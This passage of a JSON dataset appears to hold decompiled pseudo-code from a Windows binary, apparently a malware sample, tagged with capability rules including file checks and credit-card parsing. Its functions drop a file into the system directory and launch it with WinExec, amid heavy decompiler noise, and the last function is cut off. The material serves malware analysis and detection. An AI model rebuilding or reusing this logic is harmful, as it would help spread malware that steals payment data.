        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401da7) overlaps instruction at (ram,0x00401da4)\n// \n// WARNING: Removing unreachable block (ram,0x00401d98)\n// WARNING: Removing unreachable block (ram,0x00401da0)\n\nuint __cdecl fcn.00401d50(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar2 = (**0x424614)(2, 0);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar4 = &var_128h;\n    for (iVar3 = 0x49; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar3 = (**0x424618)(iVar2, &var_12ch);\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (iVar3 == 0) {\ncode_r0x00401e1d:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_4h;\n        }\n        iVar3 = (*pcVar1)(&var_108h, arg_8h);\n        if (iVar3 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00401e1d;\n        }\n        iVar3 = (**0x42461c)(iVar2, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 448
    },
    "00401e30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401e30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 73
    },
    "00401e90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f67) overlaps instruction at (ram,0x00401f64)\n// \n// WARNING: Removing unreachable block (ram,0x00401f67)\n// WARNING: Removing unreachable block (ram,0x00402004)\n\nbool fcn.00401e90(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint32_t unaff_EDI;\n    uint *puVar5;\n    bool bVar6;\n    uchar auStack276 [124];\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uint var_1fh;\n    uint uStack8;\n    \n    puVar5 = &stack0xfffffffc;\n    iVar2 = fcn.004030e0();\n    if (iVar2 == 0) {\n        return false;\n    }\n    fcn.004045b0();\n    iVar2 = fcn.00401d50(0x4241c4);\n    bVar6 = iVar2 == -1;\n    if (bVar6) {\n        fcn.00402690();\n        *0x4245ec = 1;\n        puVar4 = &stack0xfffffffc;\n        if ((!bVar6) && (puVar4 = &stack0xfffffffc,  bVar6)) {\n            puVar3 = &stack0xffffff6c;\n            puVar4 = &stack0xffffff6c;\n            cVar1 = '\\x10';\n            do {\n                puVar5 = puVar5 + -1;\n                puVar3 = puVar3 + -1;\n                *puVar3 = *puVar5;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n        }\n        iVar2 = fcn.00404c60();\n        if (iVar2 == 0) {\n            if ((-1 < iVar2) && (-1 >= iVar2)) {\n                *(unaff_EDI | puVar4) = 0;\n            }\n            puVar4[-0x20] = 0;\n            puVar4[-0x80] = 0;\n            puVar5 = puVar4 + -0x1f;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            puVar4[-0x60] = 0;\n            puVar5 = puVar4 + -0x7f;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            puVar4[-0x40] = 0;\n            puVar5 = puVar4 + -0x5f;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            puVar5 = puVar4 + -0x3f;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            iVar2 = fcn.004014e0(puVar4 + -0x80, puVar4 + -0x60, puVar4 + -0x20, puVar4 + -0x40);\n            if (iVar2 != 0) {\n                iVar2 = fcn.00401080(puVar4 + -0x20);\n                if (iVar2 == 0) {\n                    return false;\n                }\n                iVar2 = fcn.00402dd0(puVar4 + -0x80, puVar4 + -0x60, puVar4 + -0x20, puVar4 + -0x40);\n                return iVar2 != 0;\n            }\n            return false;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 1019
    },
    "00402dd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004030be) overlaps instruction at (ram,0x004030bc)\n// \n// WARNING: Removing unreachable block (ram,0x00403019)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * __cdecl fcn.00402dd0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    char cVar6;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar7;\n    int32_t extraout_ECX;\n    char *pcVar8;\n    uint uVar9;\n    uint *puVar10;\n    ushort in_SS;\n    bool bVar11;\n    uint8_t in_AF;\n    ulong uVar12;\n    uchar lpBuffer;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &stack0xfffffffc;\n    lpBuffer = 0;\n    puVar10 = &var_213h;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    s = 0;\n    puVar10 = &var_10fh;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    var_ch = 0x1;\n    *(puVar10 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x424180, &lpBuffer);\n    fcn.00401980(&var_4h);\n    uVar2 = fcn.00404ca0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h);\n    bVar11 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        return NULL;\n    }\n    if ((bVar11) && (!bVar11)) {\n        puVar10 = &stack0xfffffdd0;\n        cVar6 = '\\x1e';\n        do {\n            puVar3 = puVar3 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar3;\n            cVar6 = cVar6 + -1;\n        } while ('\\0' < cVar6);\n        puVar3 = in(0x78);\n        return puVar3;\n    }\n    iVar7 = fcn.004039d0(&s);\n    if (iVar7 == 0) {\n        return NULL;\n    }\n    fcn.00402040();\n    iVar7 = fcn.00401d50(0x4241b8);\n    if (iVar7 == -1) {\n        iVar7 = fcn.00401d50(0x4241ac);\n        if (iVar7 == -1) goto code_r0x00402f98;\n        uVar9 = 0xf;\n    }\n    else {\n        uVar9 = 0xe;\n    }\n    iVar7 = fcn.00401630(arg_8h);\n    if (iVar7 != 0) {\n        fcn.004047b0();\n        fcn.00403530(uVar9);\n        return 0x1;\n    }\n    if (*0x4245e8 == 0) {\n        return NULL;\n    }\ncode_r0x00402f98:\n    uVar4 = fcn.00401c80(arg_8h, &s);\n    uVar2 = uVar4 & 0xff;\n    puVar3 = var_ch;\n    if (uVar4 == 0) {\n        uVar2 = 0;\n        puVar3 = NULL;\n    }\n    bVar11 = (POPCOUNT(uVar2) & 1U) == 0;\n    if ((!bVar11) && (bVar11)) {\n        puVar5 = segment(in_SS, *0x10 + -0x22c);\n        if (bVar11) {\n            return *puVar5;\n        }\n    }\n    if ((puVar3 != NULL) && (puVar5 = fcn.00403470(arg_8h),  puVar5 == NULL)) {\n        var_ch = NULL;\n        puVar3 = puVar5;\n    }\n    if (puVar3 == NULL) {\n        puVar3 = fcn.004036b0(arg_8h, 0);\n        var_ch = puVar3;\n    }\n    if (puVar3 != NULL) {\n        fcn.00403530();\n    }\n    bVar11 = false;\n    uVar12 = (*_sym.imp.KERNEL32.dll_Sleep)();\n    pcVar8 = uVar12 >> 0x20;\n    iVar7 = uVar12;\n    if ((bVar11) || (!bVar11)) {\n        (*_sym.imp.KERNEL32.dll_WinExec)(0x4241cc, 0);\n    }\n    else {\n        out(*puVar3, uVar12 >> 0x20);\n        do {\n            cVar6 = iVar7 >> 8;\n            in_AF = 9 < (iVar7 & 0xf) | in_AF;\n            iVar7 = CONCAT31(CONCAT21(iVar7 >> 0x10, cVar6 - in_AF), -in_AF);\n        } while (in_AF || cVar6 == *pcVar8);\n        piVar1 = puVar10 + pcVar8 * 2 + 3;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX + 0x6a) = iVar7;\n        *(iVar7 + -0x34) = *(iVar7 + -0x34) + (extraout_ECX >> 8);\n        puVar3 = puVar3 + 1;\n    }\n    return puVar3;\n}\n",
        "token_count": 1444
    },
    "00403260": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403312) overlaps instruction at (ram,0x00403311)\n// \n// WARNING: Removing unreachable block (ram,0x00403360)\n// WARNING: Removing unreachable block (ram,0x004033a9)\n\nuint64_t __cdecl fcn.00403260(uchar *arg_8h, uint arg_ch)\n\n{\n    uint16_t in_AX;\n    uint16_t uVar1;\n    char cVar2;\n    char **in_ECX;\n    char **ppcVar3;\n    uint8_t uVar4;\n    uint32_t in_EDX;\n    uint16_t unaff_BX;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    char **unaff_EDI;\n    char *pcVar8;\n    uint16_t in_ES;\n    ushort in_SS;\n    bool bVar9;\n    bool bVar10;\n    uint64_t uVar11;\n    uint var_10ch;\n    uint auStack32 [2];\n    char **ppcVar12;\n    \n    puVar5 = &stack0xfffffffc;\n    ppcVar3 = in_ECX & 0xffff;\n    uVar4 = in_EDX;\n    cVar2 = in_ECX - 1;\n    bVar10 = cVar2 == '\\0';\n    bVar9 = (POPCOUNT(cVar2) & 1U) == 0;\n    *arg_8h = 0x20;\n    ppcVar12 = unaff_EDI;\n    if ((bVar9) || (!bVar9)) {\ncode_r0x004032aa:\n        arg_8h[1] = 0x1f;\n        bVar10 = ppcVar3 == '\\x01';\n        arg_8h[2] = 0x89;\n        in_ECX = ppcVar3;\n        if (!bVar10) goto code_r0x004032ce;\n    }\n    else {\n        puVar7 = segment(in_SS, *0x10 + -0x10);\n        in_AX = *puVar7;\n        in_EDX = 0xb7bc9ea5;\n        if (uVar4 <= in_ECX) {\n            if (bVar9) {\n                uVar11 = (*_sym.imp.MSVCRT.dll__access)();\n                return uVar11 & 0xffffffff00000000 | uVar11 != -1;\n            }\n            ppcVar12 = 0xb7bc9ea5;\n            goto code_r0x004032aa;\n        }\n        *(unaff_EDI + 0x66 + in_ECX) = arg_8h;\n        ppcVar12 = in_ECX;\ncode_r0x004032ce:\n        ppcVar3 = in_ECX & 0xffff;\n        uVar4 = ppcVar3;\n        if (bVar10) {\n            unaff_EDI = CONCAT22(in_ECX, in_SS);\n            ppcVar12 = 0x47;\n            in_AX = in_AX + arg_8h;\n            goto code_r0x004032e1;\n        }\n    }\n    uVar4 = ppcVar3;\n    arg_8h[3] = 0xc6;\ncode_r0x004032e1:\n    arg_8h[4] = 0x93;\n    uVar1 = in_AX ^ unaff_BX;\n    bVar9 = (POPCOUNT(uVar1 & 0xff) & 1U) != 0;\n    arg_8h[5] = 0xd3;\n    if ((bVar9) && (!bVar9)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    arg_8h[6] = 0x8c;\n    if ((-1 < uVar1) && (-1 >= uVar1)) {\n        ppcVar12 = ppcVar12 & 0xffff0000 | in_ES;\n        arg_8h = arg_8h + -1;\n        pcVar8 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = pcVar8 + 1;\n        *pcVar8 = in_AX;\n        in_EDX = in_EDX & 0xffffff00;\n        in_AX = in_AX + (in_AX >> 8) * 'y';\n    }\n    arg_8h[7] = 0xa6;\n    bVar9 = -1 < (in_AX ^ unaff_BX);\n    arg_8h[8] = 0x7b;\n    if ((bVar9) && (!bVar9)) {\n        out(0xc4, ppcVar12);\n        in_EDX = in_EDX & 0xffffff00 | in_EDX ^ uVar4;\n        *unaff_EDI = ppcVar12;\n    }\n    arg_8h[9] = 0xc3;\n    arg_8h[10] = 2;\n    bVar9 = (CONCAT11(((ppcVar12 >> 8) - unaff_BX) + 'M', ppcVar12) & 0x26ae) != 1;\n    arg_8h[0xb] = 0xb0;\n    arg_8h[0xc] = 0x56;\n    puVar7 = &stack0xfffffffc;\n    if ((bVar9) && (puVar7 = &stack0xfffffffc,  !bVar9)) {\n        puVar6 = auStack32 + 1;\n        puVar7 = auStack32 + 1;\n        cVar2 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar5;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    arg_8h[0xd] = 0x88;\n    puVar5 = *(puVar7 + 0xc);\n    *puVar5 = 0xe;\n    return CONCAT44(in_EDX, puVar5);\n}\n",
        "token_count": 1367
    },
    "004039d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ab6) overlaps instruction at (ram,0x00403ab2)\n// \n\nuint fcn.004039d0(uint param_1, uint32_t param_2, uint param_3)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char extraout_CH;\n    uchar *extraout_ECX;\n    int32_t *piVar6;\n    uint8_t *unaff_EBX;\n    uchar *puVar7;\n    uint32_t arg_8h;\n    uint8_t in_AF;\n    bool bVar8;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    unkbyte10 Var9;\n    ulong uVar10;\n    uint uStackY71;\n    uint32_t uStack63;\n    uint32_t uStack59;\n    uint uStack55;\n    uchar *puStack51;\n    uint uStack47;\n    uint uStack43;\n    uint uStack39;\n    uint uStack35;\n    uint uStack31;\n    uint uStack27;\n    uint uStack23;\n    uchar uStack19;\n    ushort uStack18;\n    uchar auStack8 [3];\n    uchar uStack5;\n    \n    puVar7 = &stack0xfffffffc;\n    uStack19 = 0xe4;\n    uStack18 = 0x4039;\n    *0x4245e8 = fcn.004031b0();\n    uStack19 = 0;\n    uStack18 = 0;\n    uStack23 = 0x80;\n    uStack27 = 2;\n    uStack31 = 0;\n    uStack35 = 1;\n    uStack39 = 0x40000000;\n    uStack43 = param_1;\n    uStack47 = 0x403a1f;\n    uVar10 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    arg_8h = uVar10;\n    bVar8 = arg_8h + 1 < 0;\n    if (arg_8h == 0xffffffff) {\n        return 0;\n    }\n    if ((bVar8) || (!bVar8)) {\n        puStack51 = &stack0xfffffff8;\n    }\n    else {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        param_2 = arg_8h | 0x8d;\n        puVar7 = &stack0xfffffffb;\n        puStack51 = extraout_ECX;\n        param_3 = uVar10 >> 0x20;\n        arg_8h = arg_8h + 0xe40ce22a;\n    }\n    uStack47 = 0;\n    uStack63 = arg_8h;\n    uStack59 = param_2;\n    uStack55 = param_3;\n    iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (iVar3 != 0) {\n        bVar8 = false;\n        if (*0x4245e8 != 0) {\n            uStackY71 = 0x403a71;\n            iVar3 = fcn.00403910(arg_8h);\n            bVar8 = (iVar3 != 0) != 0;\n            *0x4245e8 = 1 - (iVar3 != 0);\n        }\n        if ((bVar8) || (!bVar8)) {\n            uStackY71 = 0;\n            uVar10 = fcn.004049f0();\n            Var9 = extraout_ST0_00;\n        }\n        else {\n            uStackY71 = 0x403a90;\n            uVar4 = func_0x10189a08();\n            puVar5 = uVar4 & 0xffffff00 | uVar4 + extraout_CH;\n            uVar10 = CONCAT44(arg_8h + 0x69, puVar5);\n            uVar1 = LocalDescriptorTableRegister();\n            *puVar5 = uVar1;\n            Var9 = extraout_ST0;\n        }\n        piVar6 = uVar10 >> 0x20;\n        bVar8 = 0xfffffff7 < &stack0xffffffb9;\n        if (((SCARRY4(&stack0xffffffb9, 8) == &stack0xffffffc1 < 0) &&\n            (iVar3 = uVar10,  SCARRY4(&stack0xffffffb9, 8) != &stack0xffffffc1 < 0)) ||\n           (bVar8 = false,  iVar3 = *0x4245e8,  *0x4245e8 == 0)) {\n            *(iVar3 + -0x7ce92414) = Var9;\n            uVar2 = iVar3 - 1;\n            in_AF = 9 < (uVar2 & 0xf) | in_AF;\n            uVar2 = uVar2 + in_AF * '\\x06';\n            *piVar6 = *piVar6 + -0x175e207c;\n            puVar7[0x560775c1] =\n                 puVar7[0x560775c1] + uVar2 + (0x90 < (uVar2 & 0xf0) | bVar8 | in_AF * (0xf9 < uVar2)) * '`';\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1213
    },
    "00404c60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00404c60(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401700(0x424160);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "004020e0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004023b7) overlaps instruction at (ram,0x004023b6)\n// \n\nvoid fcn.004020e0(void)\n\n{\n    uint8_t *puVar1;\n    uint8_t **ppuVar2;\n    uint16_t uVar3;\n    int16_t iVar4;\n    uint8_t extraout_AH;\n    uint uVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint16_t extraout_CX;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uchar *extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    uint extraout_ECX_03;\n    int32_t *extraout_ECX_04;\n    int32_t *extraout_ECX_05;\n    int32_t *piVar8;\n    int32_t extraout_ECX_06;\n    char extraout_DH;\n    char extraout_DH_00;\n    char *pcVar9;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint8_t *unaff_EBX;\n    uint32_t unaff_EBP;\n    uint *puVar10;\n    uint *puVar11;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar12;\n    ushort in_CS;\n    ushort in_SS;\n    uint8_t uVar13;\n    uchar uVar14;\n    bool bVar15;\n    uint8_t in_AF;\n    uchar uVar16;\n    bool bVar17;\n    char cVar18;\n    char cVar19;\n    ulong uVar20;\n    uint in_stack_ffffa14d;\n    uint in_stack_ffffa151;\n    uchar in_stack_ffffa155;\n    uchar in_stack_ffffa156;\n    uchar in_stack_ffffa157;\n    uchar in_stack_ffffa158;\n    uint in_stack_ffffa161;\n    uchar in_stack_ffffa165;\n    ushort in_stack_ffffa166;\n    uchar in_stack_ffffa168;\n    int32_t iVar21;\n    uint in_stack_ffffa16d;\n    uint in_stack_ffffa171;\n    unkbyte3 Var22;\n    ushort uVar23;\n    uchar uVar24;\n    uint8_t uVar25;\n    uchar in_stack_ffffa185;\n    ushort in_stack_ffffa186;\n    uchar in_stack_ffffa188;\n    uint uStack24170;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    int32_t arg_14h;\n    uint arg_ch;\n    uint arg_10h;\n    uint32_t uVar26;\n    uint arg_10h_00;\n    uint arg_14h_00;\n    \n    fcn.00403600(0x411154, 10, 0x424174, 10);\n    arg_10h = 0x424180;\n    arg_ch = 10;\n    uVar3 = fcn.00403600(0x411154, 10, 0x424180, 0x12);\n    uVar13 = 0;\n    bVar15 = (POPCOUNT((uVar3 & 0xae) - 1 & 0xff) & 1U) == 0;\n    arg_14h_00 = 0x424194;\n    arg_10h_00 = 10;\n    uVar26 = 0x40214e;\n    uVar20 = fcn.00403600(0x411154, 10, 0x424194, 4);\n    pcVar9 = uVar20 >> 0x20;\n    uVar5 = uVar20;\n    if ((bVar15) || (uVar26 = uVar26 & 0xffff | unaff_ESI << 0x10,  !bVar15)) {\n        uVar26 = 0xc;\n        arg_10h = 0x424198;\n        arg_ch = 10;\n    }\n    else {\n        puVar10 = unaff_ESI + 1;\n        out(*unaff_ESI, uVar20 >> 0x20);\n        uVar13 = in_AF;\n        do {\n            cVar18 = uVar5 >> 8;\n            uVar13 = 9 < (uVar5 & 0xf) | uVar13;\n            uVar5 = CONCAT31(CONCAT21(uVar5 >> 0x10, cVar18 - uVar13), -uVar13);\n            unaff_ESI = puVar10;\n            in_AF = uVar13;\n        } while (uVar13 || cVar18 == *pcVar9);\n    }\n    piVar8 = unaff_EDI + pcVar9 * 2;\n    *piVar8 = (*piVar8 + 0x7b) - uVar13;\n    *(extraout_ECX + 0x6a) = uVar5;\n    puVar1 = pcVar9 + 0xb;\n    uVar13 = extraout_ECX + 1 >> 8;\n    uVar14 = CARRY1(*puVar1, uVar13);\n    *puVar1 = *puVar1 + uVar13;\n    fcn.00403600(0x411154, arg_ch, arg_10h, uVar26);\n    uVar20 = fcn.00403600(0x411154, 10, 0x4241a4, 7);\n    iVar21 = uVar20 >> 0x20;\n    if ((uVar14) || (arg_14h = iVar21,  !uVar14)) {\n        arg_14h = 0xb;\n        in_stack_ffffffbc = 0x4241ac;\n        in_stack_ffffffb8 = 10;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    puVar10 = unaff_EBP | *(uVar20 + (uVar14 == false) + 0x7c8ecab9);\n    pcVar9 = iVar21 + 0xb;\n    *pcVar9 = *pcVar9 + (extraout_ECX_00 + 1 >> 8);\n    fcn.00403600(0x411154, in_stack_ffffffb8, in_stack_ffffffbc, arg_14h);\n    if ((SCARRY4(&stack0xffffffb4, 0x40)) || (!SCARRY4(&stack0xffffffb4, 0x40))) {\n        arg_14h_00 = 0x4241b8;\n        arg_10h_00 = 10;\ncode_r0x004021e3:\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*extraout_ECX_01, unaff_EBX);\n        pcVar9 = extraout_EDX + 0xb;\n        cVar18 = extraout_ECX_01 + 1 >> 8;\n        uVar14 = SCARRY1(*pcVar9, cVar18);\n        *pcVar9 = *pcVar9 + cVar18;\n        bVar15 = *pcVar9 == '\\0';\n        fcn.00403600(0x411154, 0x56, arg_10h_00, arg_14h_00);\n        puVar11 = puVar10;\n        if ((!bVar15) && (bVar15)) {\n            puVar12 = &stack0xffffffdc;\n            puVar11 = &stack0xffffffdc;\n            cVar18 = '\\x10';\n            do {\n                puVar10 = puVar10 + -1;\n                puVar12 = puVar12 + -1;\n                *puVar12 = *puVar10;\n                cVar18 = cVar18 + -1;\n            } while ('\\0' < cVar18);\n        }\n        in_stack_ffffa171 = 10;\n        in_stack_ffffa16d = 0x411154;\n        fcn.00403600(0x411154, 10, 0x4241c4, 8);\n        if ((uVar14) || (iVar21 = extraout_ECX_02,  !uVar14)) {\n            iVar21 = 0xd;\n            in_stack_ffffa165 = 0xcc;\n            in_stack_ffffa166 = 0x4241;\n            in_stack_ffffa168 = 0;\n            in_stack_ffffa161 = 10;\n        }\n        *unaff_EDI = *unaff_ESI;\n        *0xcc680d75 = *0xcc680d75 + (extraout_ECX_02 + 1 >> 8);\n        fcn.00403600(0x411154, in_stack_ffffa161, \n                     CONCAT13(in_stack_ffffa168, CONCAT21(in_stack_ffffa166, in_stack_ffffa165)), iVar21);\n        puVar12 = CONCAT13(in_stack_ffffa158, CONCAT12(in_stack_ffffa157, in_SS));\n        in_stack_ffffa155 = 0x47;\n        in_stack_ffffa156 = 0;\n        in_stack_ffffa157 = 0;\n        in_stack_ffffa158 = 0;\n        in_stack_ffffa151 = 0x4241dc;\n        in_stack_ffffa14d = 10;\n        puVar10 = puVar11;\n    }\n    else {\n        puVar12 = unaff_EDI + 1;\n        uVar14 = in(extraout_EDX);\n        *unaff_EDI = uVar14;\n        unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n        unaff_EDI = puVar12;\n        if (0xffffffbf < &stack0xffffffb4 || *0x10 == 0xc) goto code_r0x004021e3;\n        *(extraout_EDX + 0xb) = *(extraout_EDX + 0xb) + (extraout_ECX_01 + 1 >> 8);\n    }\n    uVar20 = fcn.00403600(0x411154, in_stack_ffffa14d, in_stack_ffffa151, \n                          CONCAT13(in_stack_ffffa158, \n                                   CONCAT12(in_stack_ffffa157, CONCAT11(in_stack_ffffa156, in_stack_ffffa155))));\n    if ((&stack0xffffa189 < 0) || (&stack0xffffa189 >= 0)) {\n        in_stack_ffffa185 = 0x25;\n        in_stack_ffffa186 = 0;\n        in_stack_ffffa188 = 0;\n    }\n    uVar26 = uVar20 + 0xe40ce22a;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    bVar15 = (POPCOUNT(*((uVar20 >> 0x20) + 0x25) - puVar10 & 0xff) & 1U) == 0;\n    fcn.00403600(0x411154, 10, 0x4241f4, CONCAT13(in_stack_ffffa188, CONCAT21(in_stack_ffffa186, in_stack_ffffa185)));\n    if (bVar15) {\ncode_r0x0040229a:\n        uVar14 = 10;\n        uVar23 = 0;\n        uVar16 = 0;\n        in_stack_ffffa171 = 0x42421c;\n        in_stack_ffffa16d = 10;\n    }\n    else {\n        uVar14 = extraout_ECX_03;\n        uVar23 = extraout_ECX_03 >> 8;\n        uVar16 = extraout_ECX_03 >> 0x18;\n        if (!bVar15) goto code_r0x0040229a;\n    }\n    *(extraout_EDX_00 + 10) = *(extraout_EDX_00 + 10) + -0x68;\n    *(extraout_EDX_00 + 0xb) = *(extraout_EDX_00 + 0xb) + (extraout_ECX_03 >> 8);\n    fcn.00403600(0x411154, in_stack_ffffa16d, in_stack_ffffa171, CONCAT13(uVar16, CONCAT21(uVar23, uVar14)));\n    fcn.00403600(0x411154, 10, 0x424228, 0xc);\n    fcn.00403600(0x411154, 10, 0x424234, 0xd);\n    fcn.00403600(0x411154, 10, 0x424244, 6);\n    fcn.00403600(0x411154, 10, 0x42424c, 5);\n    fcn.00403600(0x411154, 10, 0x424254, 0xd);\n    uVar14 = false;\n    cVar19 = '\\0';\n    cVar18 = '\\0';\n    uVar16 = (((extraout_CX & 0x4ed ^ 0x3f6f) >> 8) + extraout_DH & 0x5bU) == 0;\n    puVar6 = fcn.00403600(0x411154, 10, 0x424264, 0x19);\n    if ((!uVar16) && (uVar16)) {\n        unaff_EBX = unaff_EBX + 1;\n        uVar13 = puVar6;\n        if (uVar14 || unaff_EBX == NULL) {\n            *extraout_ECX_04 = *extraout_ECX_04 + uVar14;\n            *puVar6 = *puVar6 + uVar13;\n            piVar8 = extraout_ECX_04;\n            goto code_r0x004023f9;\n        }\n        in_AF = 9 < (uVar13 & 0xf) | in_AF;\n        ppuVar2 = (puVar6 & 0xffff0000 | CONCAT11((puVar6 >> 8) + in_AF, uVar13 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        uVar14 = *ppuVar2 < unaff_EBX;\n        *ppuVar2 = *ppuVar2 + -unaff_EBX;\n        cVar19 = SCARRY4(uVar26, 1);\n        uVar26 = uVar20 + 0xe40ce22b;\n        cVar18 = uVar26 < 0;\n        uVar16 = uVar26 == 0;\n    }\n    while( true ) {\n        fcn.00403600(0x411154, 10, 0x424280, 0xf);\n        if (!uVar16 && cVar19 == cVar18) {\n            uVar26 = uVar26 & 0xffff0000 | uVar26 & 0xff | (uVar26 >> 8) << 8;\n        }\n        puVar6 = fcn.00403600(0x411154, 10, 0x424290, 0xe);\n        if ((uVar14) || (piVar8 = extraout_ECX_05,  !uVar14)) break;\ncode_r0x004023f9:\n        uVar7 = puVar6 + 1;\n        if (&stack0xffffa17a < *puVar6 || uVar7 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar6 = piVar8 & 0xffff0000 | CONCAT11(piVar8 >> 8 | *(puVar6 + 0x55), piVar8);\n        uVar14 = CARRY4(*puVar6, uVar7);\n        cVar19 = SCARRY4(*puVar6, uVar7) != SCARRY4(*puVar6 + uVar7, 0);\n        *puVar6 = *puVar6 + uVar7;\n        cVar18 = *puVar6 < 